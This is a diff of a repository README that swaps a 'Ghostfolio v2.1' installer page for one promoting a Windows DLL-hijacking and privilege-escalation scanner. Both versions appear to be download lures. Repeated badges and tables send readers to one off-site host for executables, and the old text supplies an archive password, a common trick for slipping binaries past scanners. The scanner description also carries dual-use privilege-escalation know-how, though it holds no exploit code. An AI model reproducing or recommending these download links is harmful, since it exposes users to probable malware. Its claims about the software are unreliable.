@@ -1,107 +1,161 @@
-<p align="center">
-  <a href="https://yeelen.cg/gh/">
-    <img src="assets/logo.png" alt="Ghostfolio Logo" width="140" />
-  </a>
-</p>
+Repository: Robber-DLL-Hijack-Scanner
+Description: A standalone, dependency-free Windows utility designed to identify DLL hijacking opportunities and privilege escalation vectors by analyzing PE import tables and directory write permissions.
+Tags: dll-hijacking privilege-escalation windows-security delphi red-team penetration-testing pe-analysis cybersecurity evasion-techniques reverse-engineering vulnerability-scanner post-exploitation system-auditing static-analysis
 
-<h1 align="center">Ghostfolio v2.1 — Open Source Wealth Management & Portfolio Tracker</h1>
+Description:
 
-<p align="center">
-  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
-</p>
+# 🛡️ Robber DLL Hijack Scanner
 
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Setup-blue?style=for-the-badge&logo=windows" alt="Download Release"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Platform-Windows_|_macOS_|_Linux-lightgrey?style=for-the-badge" alt="Platform Support"></a>
-</p>
+An advanced, lightweight Windows security assessment utility engineered to detect DLL hijacking vectors, missing dependencies, and local privilege escalation paths through automated PE header parsing and discretionary access control list (DACL) validation.
 
-<p align="center">
-  <a href="#-direct-downloads--links"><strong>📥 Direct Downloads</strong></a> •
-  <a href="#-about-ghostfolio">About</a> •
-  <a href="#-key-features">Key Features</a> •
-  <a href="#-system-requirements">Requirements</a> •
-  <a href="#-installation--setup">Installation</a> •
-  <a href="#-frequently-asked-questions">FAQ</a>
-</p>
+[![Download Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release") [![Download Latest Release](https://img.shields.io/badge/Download%20v1.1-red?style=for-the-badge&logo=windows&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release") [![Primary Mirror](https://img.shields.io/badge/Primary%20Mirror-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Main")
 
 ---
 
-## 📖 About Ghostfolio
+## 📌 Navigation Menu
 
-**Ghostfolio** is a modern, privacy-focused, open-source personal finance and wealth management application. It empowers individuals to track their financial portfolio, monitor asset allocation, calculate investment returns, and analyze net worth over time without compromising sensitive personal data.
-
-Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts, or cryptocurrencies, Ghostfolio delivers a comprehensive, data-driven financial dashboard built for security, autonomy, and ease of use.
-
-<p align="center">
-  <img src="assets/banner.jpg" alt="Ghostfolio Financial Dashboard Preview" width="100%" />
-</p>
-
----
-
-## 📥 Direct Downloads & Links
-
-Get the latest standalone build, offline installers, or source files directly using the direct mirrors below:
-
-| Package Option | Format / Platform | Download Link |
-| :--- | :--- | :--- |
-| **Complete Application Setup** | Executable (`.exe`) | 👉 **[Download Windows Installer](https://yeelen.cg/gh/)** |
-| **macOS Bundle Package** | Disk Image (`.dmg`) | 👉 **[Download macOS Installer](https://yeelen.cg/gh/)** |
-| **Source Code (Latest Build)** | Archive (`.zip`) | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
-| **Source Code (Tarball)** | Archive (`.tar.gz`) | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |
-
-> 🔑 **Archive Password (if prompted):** `github`
+* [Overview & Core Value](#-overview--core-value)
+* [Key Features](#-key-features)
+* [Download & Installation](#-download--installation)
+* [Usage & CLI Reference](#-usage--cli-reference)
+* [How It Works: Engine Architecture](#-how-it-works-engine-architecture)
+* [Use Cases & Threat Hunting](#-use-cases--threat-hunting)
+* [Mitigation Strategies](#-mitigation-strategies)
+* [Disclaimer & License](#-disclaimer--license)
 
 ---
 
-## ✨ Key Features & Capabilities
+## 📋 Overview & Core Value
 
-### 📈 Multi-Asset Investment Tracking
-* **Global Stocks & ETFs:** Support for global exchanges, market indices, and mutual funds with automated live market data fetching.
-* **Cryptocurrency Integration:** Track Bitcoin, Ethereum, and thousands of altcoins via integrated crypto market feeds.
-* **Cash & Commodities:** Keep track of fiat currency balances, physical gold, silver, and alternative assets in one place.
+**Robber-DLL-Hijack-Scanner** is an essential static security analysis tool tailored for Red Teams, penetration testers, and security auditors operating within enterprise Windows environments.
 
-### 📊 Advanced Portfolio Analytics & Insights
-* **Performance Metrics:** Calculate precise Return on Investment (ROI), Return on Average Investment (ROAI), and Dividend Yield across multiple timeframes (1D, 1M, YTD, 1Y, 5Y, Max).
-* **Asset Allocation Breakdown:** Dynamic visualization of portfolio diversification by asset class, market sector, currency, and geographic location.
-* **Dividend Calendar:** Monitor incoming payouts and analyze dividend growth trends over time.
+In modern Windows systems, applications frequently load external dynamic-link libraries (`.dll`) during runtime. When an executable relies on an unpinned or non-existent DLL, or when binary search orders favor user-writable directories (such as `%PATH%` entries or application folders), adversaries can place malicious DLLs to execute arbitrary code with elevated privileges.
 
-### 🛡️ Privacy, Security & Data Autonomy
-* **Zero Tracking:** No intrusive tracking, third-party analytics, or data monetization.
-* **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
-* **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.
-
-### ⚡ Seamless Data Management
-* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
-* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.
+Robber inspects binary Import Address Tables (IAT), recursively resolves runtime DLL search orders (`SafeDllSearchMode`), and evaluates write permissions across system paths without executing target binaries or requiring runtime injection.
 
 ---
 
-## 🖥️ System Requirements
+## ⚡ Key Features
 
-Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:
-
-* **Operating System:** Windows 10/11 (64-bit), macOS 11+, or Linux Distribution
-* **RAM:** Minimum 2 GB RAM (4 GB recommended)
-* **Disk Space:** 500 MB free storage for core application files
+* 🚀 **Zero Outer Dependencies** — Compiled natively in Delphi/Pascal into a single portable executable. No Python runtime, .NET runtime, or DLL drivers required.
+* 🔍 **Recursive Import Table Analysis** — Parses Portable Executable (`PE32` and `PE32+`) headers directly from disk to unpack required export calls and library names.
+* 🛡️ **DACL & Access Token Verification** — Queries Discretionary Access Control Lists (DACLs) against the executing process security context to locate paths permitting `FILE_ADD_FILE`, `FILE_WRITE_DATA`, or `GENERIC_WRITE`.
+* 🎯 **Phantom DLL Identification** — Automatically highlights hardcoded DLL calls where the requested library does not exist natively on the OS, creating prime targets for privilege escalation.
+* ⚙️ **Custom Search Order Emulation** — Faithfully mirrors Windows standard DLL search pathways (Application directory → System32 → SysWOW64 → Current Directory → Environment PATH).
+* 📑 **Structured Automation Output** — Native support for JSON, CSV, and formatted HTML reports suitable for seamless CI/CD integration and SIEM ingestion.
 
 ---
 
-## 🚀 Installation & Setup
+## 🚀 Download & Installation
 
-### Method 1: Direct Executable Installation (Quickest)
-1. Download the setup file from the **[Direct Download Link](https://yeelen.cg/gh/)**.
-2. Unpack the downloaded archive (Password: `github`).
-3. Run `Ghostfolio-Setup.exe` and follow the on-screen installation steps.
+Get the official compiled release binary or mirror sources:
 
-### Method 2: Manual CLI Deployment
+[![Get Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release") [![Download Binary](https://img.shields.io/badge/Download%20v1.1-red?style=for-the-badge&logo=windows&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release")
+
+Or clone the source repository directly:
+
 ```bash
 # Clone the repository
-git clone [https://github.com/your-username/ghostfolio-v2.1-installer.git](https://github.com/your-username/ghostfolio-v2.1-installer.git)
+git clone https://github.com/HydraSoft/Robber-DLL-Hijack-Scanner.git
 
-# Navigate into workspace
-cd ghostfolio-v2.1-installer
+# Navigate into directory
+cd Robber-DLL-Hijack-Scanner
+```
 
-# Launch application stack
-docker compose up -d
+---
+
+## 🛠️ Usage & CLI Reference
+
+Robber offers an intuitive command-line interface capable of analyzing individual binaries or sweeping entire disk partitions.
+
+### Quick Commands
+
+| Mode | Command Line Example | 
+| ----- | ----- | 
+| **Single Target** | `RobberScanner.exe -t "C:\Program Files\App\target.exe" -v` | 
+| **Directory Sweep** | `RobberScanner.exe -d "C:\Program Files" -o report.json -f json` | 
+| **System PATH Audit** | `RobberScanner.exe --check-path --severity high` | 
+| **Export HTML** | `RobberScanner.exe -d "C:\Tools" -o scan_results.html -f html` | 
+
+### Parameter Breakdown
+
+```text
+Flags:
+  -t, --target <path>      Specify full path to a single target .exe or .dll file
+  -d, --dir <path>         Recursively scan all PE binaries inside target directory
+  -o, --output <file>      Export report file path (default: stdout)
+  -f, --format <type>      Output format: console, json, csv, html (default: console)
+  --check-path             Inspect system %PATH% environment variables for DACL flaws
+  -v, --verbose            Enable detailed logging during parsing stages
+  -h, --help               Display help options and exit
+```
+
+---
+
+## 📊 How It Works: Engine Architecture
+
+The scanning pipeline operates strictly through static file analysis and Windows Win32 API calls:
+
+```text
++-------------------------------------------------------+
+|                 Target Selection                      |
+|         (File Target / Directory Recursion)          |
++---------------------------+---------------------------+
+                            |
+                            v
++-------------------------------------------------------+
+|                 PE Header Inspection                  |
+|    - Read DOS/NT/Optional Headers                     |
+|    - Extract Import Directory Table entries           |
++---------------------------+---------------------------+
+                            |
+                            v
++-------------------------------------------------------+
+|             DLL Search Path Resolution                |
+|    - Apply Windows SafeDllSearchMode logic            |
+|    - Classify: Found, Missing (Phantom), or Custom    |
++---------------------------+---------------------------+
+                            |
+                            v
++-------------------------------------------------------+
+|              Security Context Audit                   |
+|    - Read Security Descriptor & Access Mask           |
+|    - Check Write Permissions for Non-Admin Users       |
++---------------------------+---------------------------+
+                            |
+                            v
++-------------------------------------------------------+
+|               Report Generation                       |
+|    - Assign Severity Level (Critical, High, Med)      |
+|    - Format JSON / CSV / HTML / Console Output        |
++-------------------------------------------------------+
+```
+
+---
+
+## 🔎 Use Cases & Threat Hunting
+
+1. **Red Team Operations**: Uncover zero-day privilege escalation vectors in legacy software deployments on target hosts.
+2. **Blue Team Hardening**: Audit enterprise gold images and third-party software packages before deployment.
+3. **Application Security Auditing**: Verify that vendor software strictly enforces secure DLL loading practices (e.g., calling `SetDefaultDllDirectories`).
+
+---
+
+## 🛡️ Mitigation Strategies
+
+To defend against DLL Hijacking vulnerabilities uncovered by this tool, developers and administrators should implement the following recommendations:
+
+1. **Use Absolute Paths**: Always pass fully qualified paths when invoking `LoadLibrary` or `LoadLibraryEx`.
+2. **Enable Safe DLL Search Mode**: Ensure `SafeDllSearchMode` is enabled via Registry (`HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode`).
+3. **Set Default DLL Directories**: Call API function `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)` during application initialization.
+4. **Harden Directory Permissions**: Restrict write access to application directories and system `%PATH%` entries to System and Administrator accounts.
+
+---
+
+## 🔒 Disclaimer & License
+
+> **Notice:** This project is provided strictly for educational purposes, security research, and authorized auditing. Authorization from system owners must be secured prior to running assessments on external networks or devices.
+
+Distributed under the **MIT License**. Copyright (c) HydraSoft Security.
+
+[![Download Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release")
